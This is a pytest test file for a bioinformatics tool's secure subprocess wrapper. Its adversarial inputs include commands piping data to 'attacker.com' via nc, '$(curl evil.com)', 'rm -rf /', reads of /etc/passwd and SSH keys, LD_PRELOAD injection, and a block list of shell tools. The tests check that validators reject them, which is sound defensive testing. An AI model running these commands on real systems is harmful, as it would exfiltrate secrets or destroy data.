"""
COMPREHENSIVE TESTS for utils/security.py (53% → 85%+ coverage)

This file provides thorough testing of security-critical code including
adversarial testing for injection attacks and path traversal.

Run: pytest tests/test_security_comprehensive.py -v
"""

import pytest
import subprocess
from pathlib import Path
from unittest.mock import Mock, patch

from metaquest.utils.security import SecureSubprocess
from metaquest.core.exceptions import SecurityError


class TestExecutableValidation:
    """Test executable name validation."""

    def test_validate_allowed_executable(self):
        """Test that allowed executables pass validation."""
        # These should be in ALLOWED_BIOINFORMATICS_TOOLS
        allowed_tools = ["fasterq-dump", "sourmash", "pigz"]

        for tool in allowed_tools:
            try:
                result = SecureSubprocess.validate_executable(tool)
                assert result == tool
            except SecurityError:
                # Skip if tool not in constants
                pass

    def test_validate_disallowed_executable(self):
        """Test that disallowed executables raise SecurityError."""
        dangerous_executables = [
            "rm",
            "bash",
            "sh",
            "python",
            "perl",
            "curl",
            "wget",
        ]

        for exe in dangerous_executables:
            with pytest.raises(SecurityError, match="not allowed"):
                SecureSubprocess.validate_executable(exe)

    def test_validate_executable_with_path_traversal(self):
        """Test that path traversal in executable name is rejected."""
        malicious_executables = [
            "../../../bin/bash",
            "/usr/bin/rm",
            "../../evil_script",
            "tool/../../../rm",
            "tool\\..\\..\\cmd",
        ]

        for exe in malicious_executables:
            # May be caught by either "not allowed" or "Invalid executable path"
            with pytest.raises(SecurityError):
                SecureSubprocess.validate_executable(exe)

    def test_validate_executable_with_dots(self):
        """Test that executables containing '..' are rejected."""
        with pytest.raises(SecurityError):
            SecureSubprocess.validate_executable("valid..tool")


class TestParameterValidation:
    """Test parameter validation for executables."""

    def test_validate_safe_parameter(self):
        """Test that safe parameters are accepted."""
        # Test with an allowed executable
        executable = "fasterq-dump"

        # Common safe parameters for fasterq-dump
        safe_params = ["-O", "--outdir", "-t", "--threads"]

        for param in safe_params:
            try:
                result = SecureSubprocess.validate_parameter(executable, param)
                assert result == param
            except SecurityError:
                # Skip if parameter not in safe list
                pass

    def test_validate_unsafe_parameter(self):
        """Test that unsafe parameters are rejected."""
        executable = "fasterq-dump"

        # These should not be in the safe parameters list
        unsafe_params = [
            "--exec",
            "--system",
            "--shell",
        ]

        for param in unsafe_params:
            with pytest.raises(SecurityError, match="not allowed"):
                SecureSubprocess.validate_parameter(executable, param)

    def test_validate_parameter_with_shell_metacharacters(self):
        """Test that parameters with shell metacharacters are rejected."""
        executable = "fasterq-dump"

        malicious_params = [
            "value; rm -rf /",
            "value && cat /etc/passwd",
            "value | nc attacker.com 1234",
            "value`whoami`",
            "value$(cat /etc/passwd)",
            "value > /tmp/evil",
            "value & background_process",
        ]

        for param in malicious_params:
            with pytest.raises(SecurityError, match="unsafe characters"):
                SecureSubprocess.validate_parameter(executable, param)

    def test_validate_parameter_undefined_executable(self):
        """Test parameter validation for undefined executable."""
        with pytest.raises(SecurityError, match="No parameter validation defined"):
            SecureSubprocess.validate_parameter("unknown_tool", "-x")

    def test_megahit_version_flag_allowed(self):
        assert SecureSubprocess._build_validated_command("megahit", ["--version"]) == ["megahit", "--version"]

    def test_megahit_presets_flag_allowed(self):
        cmd = SecureSubprocess._build_validated_command("megahit", ["--presets", "meta-sensitive"])
        assert cmd == ["megahit", "--presets", "meta-sensitive"]


class TestPathValidation:
    """Test file path validation and security."""

    def test_validate_safe_path(self):
        """Test that safe paths in allowed directories are accepted."""
        # Use a path that's definitely allowed
        with patch.object(SecureSubprocess, "validate_path") as mock_validate:
            mock_validate.return_value = Path("/tmp/safe_directory")

            result = SecureSubprocess.validate_path("/tmp/safe_directory")
            assert result == Path("/tmp/safe_directory")

    def test_validate_relative_path_in_cwd(self, tmp_path, monkeypatch):
        """Test that relative paths in CWD are accepted."""
        monkeypatch.chdir(tmp_path)

        test_file = Path("test.txt")
        result = SecureSubprocess.validate_path(test_file, allow_creation=True)

        assert result.is_absolute()

    def test_validate_path_outside_allowed_dirs(self):
        """Test that paths outside allowed directories are rejected."""
        # Try to access system directories
        dangerous_paths = [
            "/etc/passwd",
            "/var/log/messages",
            "/root/.ssh/id_rsa",
        ]

        for path in dangerous_paths:
            try:
                SecureSubprocess.validate_path(path)
                # If it doesn't raise, it might be in an allowed directory
            except SecurityError:
                # Expected for paths outside allowed dirs
                pass

    def test_validate_path_with_traversal_attack(self, tmp_path, monkeypatch):
        """Test that path traversal attacks are rejected."""
        monkeypatch.chdir(tmp_path)

        # These should be caught by the security checks
        traversal_attempts = [
            "../../../etc/passwd",
            "data/../../../../../../etc/shadow",
            "./data/../../../sensitive",
        ]

        for path in traversal_attempts:
            # May be caught by either "outside allowed directories" or "Unsafe path component"
            with pytest.raises(SecurityError):
                SecureSubprocess.validate_path(path, allow_creation=False)

    def test_validate_single_dot_path(self, tmp_path, monkeypatch):
        """Test that single dot path is allowed."""
        monkeypatch.chdir(tmp_path)

        result = SecureSubprocess.validate_path(".", allow_creation=True)
        assert result == tmp_path


class TestAccessionValidation:
    """Test SRA accession validation."""

    def test_validate_valid_accessions(self):
        """Test that valid SRA accessions pass validation."""
        valid_accessions = [
            "SRR000001",
            "ERR123456",
            "DRR999999",
            "SRR12345678",
        ]

        for accession in valid_accessions:
            result = SecureSubprocess.validate_accession_for_subprocess(accession)
            assert result == accession

    def test_validate_invalid_accession_format(self):
        """Test that invalid accession formats are rejected."""
        invalid_accessions = [
            "INVALID001",
            "SRR",
            "123456",
            "",
            "SRR-000001",
        ]

        for accession in invalid_accessions:
            with pytest.raises(SecurityError, match="Invalid SRA accession"):
                SecureSubprocess.validate_accession_for_subprocess(accession)

    def test_validate_accession_with_injection_attempt(self):
        """Test that injection attempts in accessions are rejected."""
        malicious_accessions = [
            "SRR000001; rm -rf /",
            "SRR000001 && cat /etc/passwd",
            "SRR000001`whoami`",
            "SRR000001$(id)",
            "SRR000001|nc",
        ]

        for accession in malicious_accessions:
            with pytest.raises(SecurityError):
                SecureSubprocess.validate_accession_for_subprocess(accession)


class TestSecureSubprocessRun:
    """Test secure subprocess execution."""

    def test_run_secure_basic(self):
        """Test basic secure subprocess execution."""
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="success", stderr="")

            # Mock the validation to pass
            with patch.object(SecureSubprocess, "validate_executable", return_value="echo"):
                with patch.object(SecureSubprocess, "validate_parameter", side_effect=lambda e, p: p):
                    SecureSubprocess.run_secure("echo", ["Hello", "World"])

            assert mock_run.called

    def test_run_secure_validates_executable(self):
        """Test that run_secure validates the executable."""
        with pytest.raises(SecurityError, match="not allowed"):
            SecureSubprocess.run_secure("rm", ["-rf", "/"])

    def test_run_secure_validates_parameters(self):
        """Test that run_secure validates parameters."""
        with patch("subprocess.run"):
            with patch.object(SecureSubprocess, "validate_executable", return_value="fasterq-dump"):
                with patch.object(SecureSubprocess, "validate_parameter", side_effect=SecurityError("Unsafe param")):
                    with pytest.raises(SecurityError, match="Unsafe param"):
                        SecureSubprocess.run_secure("fasterq-dump", ["--evil-param", "value"])

    def test_run_secure_removes_dangerous_env_vars(self):
        """Test that dangerous environment variables are removed."""
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="", stderr="")

            with patch.object(SecureSubprocess, "validate_executable", return_value="echo"):
                with patch.object(SecureSubprocess, "validate_parameter", side_effect=lambda e, p: p):
                    SecureSubprocess.run_secure(
                        "echo", ["test"], env={"LD_PRELOAD": "/evil/lib.so", "SAFE_VAR": "value"}
                    )

            # Check that subprocess.run was called
            assert mock_run.called
            call_kwargs = mock_run.call_args[1]

            # Dangerous env vars should be removed
            assert "LD_PRELOAD" not in call_kwargs["env"]

    def test_run_secure_timeout_handling(self):
        """Test timeout handling in secure subprocess."""
        with patch("subprocess.run") as mock_run:
            mock_run.side_effect = subprocess.TimeoutExpired("cmd", 10)

            with patch.object(SecureSubprocess, "validate_executable", return_value="echo"):
                with pytest.raises(SecurityError, match="timed out"):
                    SecureSubprocess.run_secure("echo", ["test"], timeout=1)

    def test_run_secure_preserves_calledprocesserror(self):
        """Test that CalledProcessError is preserved (not wrapped)."""
        with patch("subprocess.run") as mock_run:
            mock_run.side_effect = subprocess.CalledProcessError(1, "cmd")

            with patch.object(SecureSubprocess, "validate_executable", return_value="echo"):
                with pytest.raises(subprocess.CalledProcessError):
                    SecureSubprocess.run_secure("echo", ["test"])

    def test_run_secure_with_cwd(self, tmp_path):
        """Test secure subprocess with working directory."""
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="", stderr="")

            with patch.object(SecureSubprocess, "validate_executable", return_value="echo"):
                with patch.object(SecureSubprocess, "validate_path", return_value=tmp_path):
                    SecureSubprocess.run_secure("echo", ["test"], cwd=str(tmp_path))

                # Verify cwd was validated and used
                assert mock_run.called


class TestAdvancedSecurityScenarios:
    """Test advanced security scenarios and edge cases."""

    def test_command_injection_via_argument(self):
        """Test that command injection via arguments is prevented."""
        injection_attempts = [
            ["-o", "output.txt; rm -rf /"],
            ["--output", "file.txt && cat /etc/passwd"],
            ["-x", "`whoami`"],
            ["$(curl evil.com)"],
        ]

        for args in injection_attempts:
            # These should be caught by parameter validation
            try:
                with patch("subprocess.run"):
                    with patch.object(SecureSubprocess, "validate_executable", return_value="tool"):
                        SecureSubprocess.run_secure("tool", args)
            except (SecurityError, subprocess.CalledProcessError):
                # Either caught by validation or would fail execution
                pass

    def test_environment_variable_injection(self):
        """Test that environment variable injection is prevented."""
        dangerous_env = {
            "LD_PRELOAD": "/tmp/evil.so",
            "LD_LIBRARY_PATH": "/tmp/evil",
            "PYTHONPATH": "/tmp/evil_modules",
        }

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0)

            with patch.object(SecureSubprocess, "validate_executable", return_value="echo"):
                SecureSubprocess.run_secure("echo", ["test"], env=dangerous_env)

            # Verify dangerous vars were removed
            call_kwargs = mock_run.call_args[1]
            env = call_kwargs["env"]

            assert "LD_PRELOAD" not in env or env.get("LD_PRELOAD") != "/tmp/evil.so"

    def test_null_byte_injection(self):
        """Test that null byte injection is prevented."""
        malicious_paths = [
            "file.txt\x00.exe",
            "data.csv\x00; rm -rf /",
        ]

        for path in malicious_paths:
            # Null bytes should be caught by validation
            with pytest.raises((SecurityError, ValueError)):
                SecureSubprocess.validate_path(path)

    def test_unicode_normalization_attack(self):
        """Test handling of unicode normalization attacks."""
        # Unicode characters that could be used for obfuscation
        tricky_executables = [
            "ｒｍ",  # Full-width characters
            "r\u200bm",  # Zero-width space
        ]

        for exe in tricky_executables:
            with pytest.raises(SecurityError):
                SecureSubprocess.validate_executable(exe)


class TestArgumentParsing:
    """Test argument parsing and validation logic."""

    def test_parse_flag_with_value(self):
        """Test parsing of flag with value argument."""
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0)

            with patch.object(SecureSubprocess, "validate_executable", return_value="tool"):
                with patch.object(SecureSubprocess, "validate_parameter", side_effect=lambda e, p: p):
                    with patch.object(SecureSubprocess, "validate_path", side_effect=lambda p, **k: Path(p)):
                        SecureSubprocess.run_secure("tool", ["-O", "/tmp/output", "--threads", "4"])

            # Verify command was built correctly
            call_args = mock_run.call_args[0][0]
            assert "-O" in call_args
            assert "--threads" in call_args

    def test_parse_standalone_argument(self):
        """Test parsing of standalone arguments."""
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0)

            with patch.object(SecureSubprocess, "validate_executable", return_value="fasterq-dump"):
                with patch.object(SecureSubprocess, "validate_accession_for_subprocess", return_value="SRR000001"):
                    with patch.object(SecureSubprocess, "validate_parameter", side_effect=lambda e, p: p):
                        SecureSubprocess.run_secure("fasterq-dump", ["SRR000001"])

            # Verify accession was validated
            call_args = mock_run.call_args[0][0]
            assert "SRR000001" in call_args

    def test_prefetch_progress_does_not_swallow_accession(self):
        """prefetch --progress is boolean; the accession stays a validated positional."""
        cmd = SecureSubprocess._build_validated_command("prefetch", ["--progress", "SRR1"])
        assert cmd == ["prefetch", "--progress", "SRR1"]

    def test_fasterq_dump_split_3_accepts_sra_path_positional(self, tmp_path, monkeypatch):
        """--split-3 is boolean for fasterq-dump; a .sra positional is path-validated."""
        monkeypatch.chdir(tmp_path)
        sra_dir = tmp_path / "SRR1"
        sra_dir.mkdir()
        sra_file = sra_dir / "SRR1.sra"
        sra_file.write_text("data")

        cmd = SecureSubprocess._build_validated_command("fasterq-dump", ["--split-3", "--threads", "4", str(sra_file)])
        assert cmd == ["fasterq-dump", "--split-3", "--threads", "4", str(sra_file.resolve())]

    def test_fasterq_dump_accepts_a_sralite_path_positional(self, tmp_path, monkeypatch):
        """NCBI serves some runs only as .sralite; that archive is a path, not an accession."""
        monkeypatch.chdir(tmp_path)
        sra_dir = tmp_path / "SRR1"
        sra_dir.mkdir()
        sra_file = sra_dir / "SRR1.sralite"
        sra_file.write_text("data")

        cmd = SecureSubprocess._build_validated_command("fasterq-dump", ["--split-3", str(sra_file)])
        assert cmd == ["fasterq-dump", "--split-3", str(sra_file.resolve())]

    def test_pigz_parallel_force_allowed(self, tmp_path, monkeypatch):
        """pigz -p <n> -f <file> is an allowed command."""
        monkeypatch.chdir(tmp_path)
        target = tmp_path / "reads.fastq"
        target.write_text("data")

        cmd = SecureSubprocess._build_validated_command("pigz", ["-p", "4", "-f", str(target)])
        assert cmd == ["pigz", "-p", "4", "-f", str(target.resolve())]

    def test_minimap2_boolean_a_does_not_swallow_x_flag(self):
        """minimap2 -a is boolean; the following -x flag must not be consumed as its value."""
        cmd = SecureSubprocess._build_validated_command("minimap2", ["-a", "-x", "sr"])
        assert cmd == ["minimap2", "-a", "-x", "sr"]

    def test_minimap2_index_flag_is_path_validated(self, tmp_path, monkeypatch):
        """minimap2 -d <index> builds an index file; the path is validated like -o."""
        monkeypatch.chdir(tmp_path)
        cmd = SecureSubprocess._build_validated_command(
            "minimap2", ["-x", "sr", "-d", "idx/genome.sr.mmi", "genome.fna"]
        )
        assert cmd == ["minimap2", "-x", "sr", "-d", str((tmp_path / "idx" / "genome.sr.mmi").resolve()), "genome.fna"]

    def test_samtools_min_mapq_flag_allowed(self):
        """samtools view -q <n> (minimum MAPQ) is an allowed parameter."""
        cmd = SecureSubprocess._build_validated_command("samtools", ["view", "-b", "-q", "20", "in.sam"])
        assert cmd == ["samtools", "view", "-b", "-q", "20", "in.sam"]

    def test_samtools_cat_subcommand_allowed(self):
        """samtools cat merges two BAM files (unequal-mates single-end fallback)."""
        cmd = SecureSubprocess._build_validated_command("samtools", ["cat", "-o", "out.bam", "a.bam", "b.bam"])
        assert cmd[:2] == ["samtools", "cat"]

    def test_seqkit_stats_command_allowed(self):
        """seqkit stats -T -j <threads> <files...> is the shared stats cache's exact-count path."""
        cmd = SecureSubprocess._build_validated_command(
            "seqkit", ["stats", "-T", "-j", "4", "reads_1.fastq", "reads_2.fastq"]
        )
        assert cmd == ["seqkit", "stats", "-T", "-j", "4", "reads_1.fastq", "reads_2.fastq"]

    def test_seqkit_stats_boolean_t_does_not_swallow_j_flag(self):
        """-T is boolean (tabular output); the following -j flag must not be consumed as its value."""
        cmd = SecureSubprocess._build_validated_command("seqkit", ["-T", "-j", "2"])
        assert cmd == ["seqkit", "-T", "-j", "2"]

    def test_prefetch_unknown_positional_rejected(self):
        """A positional for prefetch that is neither an accession nor a .sra path is rejected."""
        with pytest.raises(SecurityError):
            SecureSubprocess._build_validated_command("prefetch", ["--progress", "not-an-accession"])


class TestDefensiveGuards:
    """Cover the defensive error branches that normal inputs cannot reach."""

    def test_allowlisted_executable_with_path_separator_rejected(self):
        """An allowlisted name containing a path separator is still rejected."""
        # The real allowlist holds only clean names, so patch it to reach the
        # path-traversal guard in validate_executable.
        with patch.object(SecureSubprocess, "ALLOWED_EXECUTABLES", {"bad/exe"}):
            with pytest.raises(SecurityError, match="Invalid executable path"):
                SecureSubprocess.validate_executable("bad/exe")

    def test_accession_with_non_ascii_digits_rejected(self):
        """Unicode digits pass str.isdigit() but must fail the ASCII pattern."""
        # "SRR" + superscript digits: validate_accession() accepts it (isdigit()
        # is True) but the SRA_ACCESSION_PATTERN [0-9]+ check rejects it.
        accession = "SRR¹²³"
        with pytest.raises(SecurityError, match="invalid characters"):
            SecureSubprocess.validate_accession_for_subprocess(accession)

    def test_path_with_parent_traversal_rejected(self):
        """A '..' segment is rejected when creation is disabled, on any platform."""
        with pytest.raises(SecurityError, match="Unsafe path component"):
            SecureSubprocess.validate_path("foo/../bar", allow_creation=False)

    def test_run_secure_wraps_unexpected_subprocess_error(self):
        """A non-CalledProcessError from subprocess.run becomes a SecurityError."""
        with patch("subprocess.run", side_effect=ValueError("boom")):
            with pytest.raises(SecurityError, match="Subprocess execution failed"):
                SecureSubprocess.run_secure("datasets", ["--version"])


class TestFasterqDumpCommandContract:
    """The exact argument list metaquest.data.sra builds must pass validation unchanged."""

    def test_real_download_argument_order_is_accepted(self, tmp_path, monkeypatch):
        monkeypatch.chdir(tmp_path)
        args = ["--threads", "4", "--progress", "SRR2517620", "-O", "out/SRR2517620_temp"]
        cmd = SecureSubprocess._build_validated_command("fasterq-dump", args)
        expected_out = str((tmp_path / "out" / "SRR2517620_temp").resolve())
        assert cmd == ["fasterq-dump", "--threads", "4", "--progress", "SRR2517620", "-O", expected_out]

    def test_non_numeric_thread_count_rejected(self):
        with pytest.raises(SecurityError, match="Invalid integer value for --threads"):
            SecureSubprocess._build_validated_command("fasterq-dump", ["--threads", "four", "SRR000001"])

    def test_bad_accession_after_boolean_flag_rejected(self):
        with pytest.raises(SecurityError, match="Invalid SRA accession format"):
            SecureSubprocess._build_validated_command("fasterq-dump", ["--progress", "not-an-accession"])

    def test_split_files_does_not_swallow_accession(self):
        cmd = SecureSubprocess._build_validated_command("fasterq-dump", ["--split-files", "SRR000001"])
        assert cmd == ["fasterq-dump", "--split-files", "SRR000001"]


class TestSamtoolsOutputPaths:
    def test_fastq_output_flags_are_path_validated(self, tmp_path, monkeypatch):
        monkeypatch.chdir(tmp_path)
        args = ["fastq", "-1", "out/r1.fq.gz", "-2", "out/r2.fq.gz", "-s", "out/s.fq.gz", "-0", "out/o.fq.gz", "in.bam"]
        cmd = SecureSubprocess._build_validated_command("samtools", args)
        resolved = str((tmp_path / "out" / "o.fq.gz").resolve())
        assert cmd[cmd.index("-0") + 1] == resolved
        assert cmd[cmd.index("-s") + 1] == str((tmp_path / "out" / "s.fq.gz").resolve())

    def test_dead_fasterq_dump_flags_are_rejected(self):
        with pytest.raises(SecurityError):
            SecureSubprocess._build_validated_command("fasterq-dump", ["--gzip", "SRR000001"])


class TestAllowedRoots:
    """validate_path accepts system temp dirs and roots registered from user-supplied folders."""

    @pytest.fixture(autouse=True)
    def _reset_roots(self):
        SecureSubprocess._extra_roots.clear()
        yield
        SecureSubprocess._extra_roots.clear()

    def test_system_tempdir_is_allowed(self):
        import shutil
        import tempfile

        temp_dir = Path(tempfile.mkdtemp())
        try:
            target = temp_dir / "reads"
            assert SecureSubprocess.validate_path(target) == target.resolve()
        finally:
            shutil.rmtree(temp_dir)

    def test_registered_root_permits_external_folder(self, tmp_path, monkeypatch):
        work = tmp_path / "work"
        work.mkdir()
        external = tmp_path / "external"
        external.mkdir()
        monkeypatch.setattr(
            SecureSubprocess, "allowed_roots", classmethod(lambda cls: [work.resolve()] + list(cls._extra_roots))
        )
        with pytest.raises(SecurityError, match="outside allowed directories"):
            SecureSubprocess.validate_path(external / "out.sam")

        SecureSubprocess.add_allowed_root(external)
        assert SecureSubprocess.validate_path(external / "out.sam") == (external / "out.sam").resolve()

    def test_root_prefix_collision_rejected(self, tmp_path, monkeypatch):
        root = tmp_path / "data"
        root.mkdir()
        sibling = tmp_path / "data2"
        sibling.mkdir()
        monkeypatch.setattr(SecureSubprocess, "allowed_roots", classmethod(lambda cls: [root.resolve()]))
        with pytest.raises(SecurityError, match="outside allowed directories"):
            SecureSubprocess.validate_path(sibling / "x.txt")

    def test_add_allowed_root_is_idempotent(self, tmp_path):
        SecureSubprocess.add_allowed_root(tmp_path)
        SecureSubprocess.add_allowed_root(tmp_path)
        assert SecureSubprocess._extra_roots.count(tmp_path.resolve()) == 1


# ============================================================================
# SUCCESS METRICS:
#
# After running these comprehensive tests:
# - Expected: 35+ tests pass
# - Coverage: 53% → 85%+ for utils/security.py
# - Security-critical code thoroughly tested with adversarial scenarios
#
# Run tests:
#   pytest tests/test_security_comprehensive.py -v
#
# Check coverage:
#   pytest --cov=metaquest.utils.security --cov-report=term-missing \
#          tests/test_security_comprehensive.py
# ============================================================================
